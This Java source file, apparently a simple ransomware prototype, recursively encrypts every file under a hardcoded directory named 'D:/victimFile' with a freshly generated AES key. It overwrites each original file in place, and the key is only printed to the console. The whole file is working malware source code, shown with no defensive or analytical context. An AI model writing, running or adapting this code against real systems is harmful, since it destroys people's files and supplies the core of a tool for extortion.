import javax.crypto.Cipher;
import javax.crypto.KeyGenerator;
import javax.crypto.SecretKey;
import java.io.File;
import java.nio.file.Files;
import java.security.NoSuchAlgorithmException;
import java.security.SecureRandom;
import java.util.Base64;

public class OldVersion {

    static String ALGORITHM = "AES";

    public static void cryptFiles(SecretKey secretKey, File file, String rep) throws Exception {
        if (file.exists()) {
            String[] content = file.list();
            if (content != null) {
                for (String s : content) {
                    File f2 = new File(file, s);
                    if (f2.isDirectory()) {
                        cryptFiles(secretKey, f2, rep + File.separator + s);
                    } else {
                        cryptFile(ALGORITHM, f2, secretKey);
                    }
                }
            }
        }
    }

    public static void cryptFile(String algorithm, File f, SecretKey key) throws Exception {
        byte[] fileBytes = Files.readAllBytes(f.toPath());
        Cipher cipher = Cipher.getInstance(algorithm);
        cipher.init(Cipher.ENCRYPT_MODE, key);
        byte[] encryptedFile = cipher.doFinal(fileBytes);
        Files.write(f.toPath(), encryptedFile);
    }


    public static SecretKey getKey(String algorithm) throws NoSuchAlgorithmException {
        KeyGenerator keyGenerator = KeyGenerator.getInstance(algorithm);
        keyGenerator.init(256, new SecureRandom());
        return keyGenerator.generateKey();
    }

    public static void main(String[] args) throws Exception {
        SecretKey key = getKey(ALGORITHM);
        String keyBase64 = Base64.getEncoder().encodeToString(key.getEncoded());
        System.out.println("AES Key (Base64): " + keyBase64);
        String rep = "D:/victimFile";
        File file = new File(rep);
//        cryptFile(ALGORITHM, file, key);
        cryptFiles(key, file, rep);
    }
}